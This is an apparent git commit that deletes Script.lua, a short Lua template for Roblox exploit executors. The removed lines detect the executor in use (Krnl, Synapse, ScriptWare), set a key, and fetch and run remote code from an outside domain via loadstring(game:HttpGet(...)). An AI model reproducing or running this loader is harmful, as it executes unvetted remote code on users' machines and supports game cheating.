ed268a6dc8361fd9e171708f41e0fa5704d709e9
x2bom <84973043+x2bom@users.noreply.github.com>
2022-01-04 13:09:14 +0700

    Delete Script.lua

--- Script.lua
+++
@@ -1,7 +0,0 @@
-return [[
-    repeat wait() until game:IsLoaded()
-    getgenv().Key = "%s"
-    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
-    repeat wait() until game:IsLoaded()
-    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
-]]
